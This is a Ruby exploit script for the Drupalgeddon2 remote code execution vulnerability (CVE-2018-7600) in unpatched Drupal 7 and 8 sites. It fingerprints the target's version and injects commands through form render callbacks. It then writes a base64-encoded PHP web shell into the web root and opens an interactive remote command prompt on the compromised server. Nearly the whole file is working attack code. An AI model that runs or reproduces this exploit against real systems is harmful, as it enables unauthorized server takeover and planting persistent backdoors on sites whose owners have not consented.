#!/usr/bin/env ruby
#
# [CVE-2018-7600] Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' (SA-CORE-2018-002) ~ https://github.com/dreadlocked/Drupalgeddon2/
#
# Authors:
# - Hans Topo ~ https://github.com/dreadlocked // https://twitter.com/_dreadlocked
# - g0tmi1k   ~ https://blog.g0tmi1k.com/ // https://twitter.com/g0tmi1k
#


require 'base64'
require 'json'
require 'net/http'
require 'openssl'
require 'readline'


# Settings - Proxy information (nil to disable)
proxy_addr = nil
proxy_port = 8080


# Settings - General
$useragent = "drupalgeddon2"
webshell = "s.php"
writeshell = true


# Settings - Payload (we could just be happy without this, but we can do better!)
#bashcmd = "<?php if( isset( $_REQUEST[c] ) ) { eval( $_GET[c]) ); } ?>'
bashcmd = "<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"
bashcmd = "echo " + Base64.strict_encode64(bashcmd) + " | base64 -d"


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Function http_post <url> [post]
def http_post(url, payload="")
  uri = URI(url)
  request = Net::HTTP::Post.new(uri.request_uri)
  request.initialize_http_header({"User-Agent" => $useragent})
  request.body = payload
  return $http.request(request)
end


# Function gen_evil_url <cmd>
def gen_evil_url(evil, feedback=true)
  # PHP function to use (don't forget about disabled functions...)
  phpmethod = $drupalverion.start_with?('8')? "exec" : "passthru"

  #puts "[*] PHP cmd: #{phpmethod}" if feedback
  puts "[*] Payload: #{evil}" if feedback

  ## Check the version to match the payload
  # Vulnerable Parameters: #access_callback / #lazy_builder / #pre_render / #post_render
  if $drupalverion.start_with?('8')
    # Method #1 - Drupal 8, mail, #post_render - response is 200
    url = $target + "user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    payload = "form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]=" + phpmethod + "&mail[a][#type]=markup&mail[a][#markup]=" + evil

    # Method #2 - Drupal 8,  timezone, #lazy_builder - response is 500 & blind (will need to disable target check for this to work!)
    #url = $target + "user/register%3Felement_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
    #payload = "form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]=exec&timezone[a][#lazy_builder][][]=" + evil
  elsif $drupalverion.start_with?('7')
    # Method #3 - Drupal 7, name, #post_render - response is 200
    url = $target + "?q=user/password&name[%23post_render][]=" + phpmethod + "&name[%23type]=markup&name[%23markup]=" + evil
    payload = "form_id=user_pass&_triggering_element_name=name"
  else
    puts "[!] Unsupported Drupal version"
    exit
  end

  # Drupal v7 needs an extra value from a form
  if $drupalverion.start_with?('7')
    response = http_post(url, payload)

    form_build_id = response.body.match(/input type="hidden" name="form_build_id" value="(.*)"/).to_s().slice(/value="(.*)"/, 1).to_s.strip
    puts "[!] WARNING: Didn't detect form_build_id" if form_build_id.empty?

    #url = $target + "file/ajax/name/%23value/" + form_build_id
    url = $target + "?q=file/ajax/name/%23value/" + form_build_id
    payload = "form_build_id=" + form_build_id
  end

  return url, payload
end


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Quick how to use
if ARGV.empty?
  puts "Usage: ruby drupalggedon2.rb <target>"
  puts "       ruby drupalgeddon2.rb https://example.com"
  exit
end
# Read in values
$target = ARGV[0]


# Check input for protocol
if not $target.start_with?('http')
  $target = "http://#{$target}"
end
# Check input for the end
if not $target.end_with?('/')
  $target += "/"
end


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Banner
puts "[*] --==[::#Drupalggedon2::]==--"
puts "-"*80
puts "[*] Target : #{$target}"
puts "[*] Write? : Skipping writing web shell" if not writeshell
puts "-"*80


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Setup connection
uri = URI($target)
$http = Net::HTTP.new(uri.host, uri.port, proxy_addr, proxy_port)


# Use SSL/TLS if needed
if uri.scheme == "https"
  $http.use_ssl = true
  $http.verify_mode = OpenSSL::SSL::VERIFY_NONE
end


# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


# Try and get version
$drupalverion = nil
# Possible URLs
url = [
  $target + "CHANGELOG.txt",
  $target + "core/CHANGELOG.txt",
  $target + "includes/bootstrap.inc",
  $target + "core/includes/bootstrap.inc",
]
# Check all
url.each do|uri|
  # Check response
  response = http_post(uri)

  if response.code == "200"
    puts "[+] Found  : #{uri} (#{response.code})"

    # Patched already?
    puts "[!] WARNING: Might be patched! Found SA-CORE-2018-002: #{url}" if response.body.include? "SA-CORE-2018-002"

    # Try and get version from the file contents
    $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip

    # If not, try and get it from the URL
    $drupalverion = uri.match(/core/)? "8.x" : "7.x" if $drupalverion.empty?

    # Done!
    break
  elsif response.code == "403"
    puts "[+] Found  : #{uri} (#{response.code})"

    # Get version from URL
    $drupalverion = uri.match(/core/)? "8.x" : "7.x"
  else
    puts "[!] MISSING: #{uri} (#{response.code})"
  end
end


# Feedback
if $drupalverion
  status = $drupalverion.end_with?('x')? "?" : "!"
  puts "[+] Drupal#{status}: #{$drupalverion}"
else
  puts "[!] Didn't detect Drupal version"
  puts "[!] Forcing Drupal v8.x attack"
  $drupalverion = "8.x"
end
puts "-"*80



# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -



# Make a request, testing code execution
puts "[*] Testing: Code Execution"
# Generate a random string to see if we can echo it
random = (0...8).map { (65 + rand(26)).chr }.join
url, payload = gen_evil_url("echo #{random}")
response = http_post(url, payload)
if response.code == "200" and not response.body.empty?
  #result = JSON.pretty_generate(JSON[response.body])
  result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
  puts "[+] Result : #{result}"

  puts response.body.match(/#{random}/)? "[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!" : "[+] Target might to be exploitable?"
else
  puts "[!] Target is NOT exploitable ~ HTTP Response: #{response.code}"
  exit
end
puts "-"*80


# Location of web shell & used to signal if using PHP shell
webshellpath = nil
prompt = "drupalgeddon2"
# Possibles paths to try
paths = [
  "./",
  "./sites/default/",
  "./sites/default/files/",
]
# Check all
paths.each do|path|
  puts "[*] Testing: File Write To Web Root (#{path})"

  # Merge locations
  webshellpath = "#{path}#{webshell}"

  # Final command to execute
  cmd = "#{bashcmd} | tee #{webshellpath}"

  # Generate evil URLs
  url, payload = gen_evil_url(cmd)
  # Make the request
  response = http_post(url, payload)
  # Check result
  if response.code == "200" and not response.body.empty?
    # Feedback
    #result = JSON.pretty_generate(JSON[response.body])
    result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
    puts "[+] Result : #{result}"

    # Test to see if backdoor is there (if we managed to write it)
    response = http_post("#{$target}#{webshellpath}", "c=hostname")
    if response.code == "200" and not response.body.empty?
      puts "[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!"
      break
    else
      puts "[!] Target is NOT exploitable. No write access here!"
    end
  else
    puts "[!] Target is NOT exploitable for some reason ~ HTTP Response: #{response.code}"
  end
  webshellpath = nil
end if writeshell
puts "-"*80 if writeshell

if webshellpath
  # Get hostname for the prompt
  prompt = response.body.to_s.strip

  # Feedback
  puts "[*] Fake shell:   curl '#{$target}#{webshell}' -d 'c=whoami'"
elsif writeshell
  puts "[!] FAILED: Coudn't find writeable web path"
  puts "[*] Dropping back direct commands (expect an ugly shell!)"
end


# Stop any CTRL + C action ;)
trap("INT", "SIG_IGN")


# Forever loop
loop do
  # Default value
  result = "ERROR"

  # Get input
  command = Readline.readline("#{prompt}>> ", true).to_s

  # Exit
  break if command =~ /exit/

  # Blank link?
  next if command.empty?

  # If PHP shell
  if webshellpath
    # Send request
    result = http_post("#{$target}#{webshell}", "c=#{command}").body
  # Direct commands
  else
    url, payload = gen_evil_url(command, false)
    response = http_post(url, payload)
    if response.code == "200" and not response.body.empty?
      result = $drupalverion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
    end
  end

  # Feedback
  puts result
end
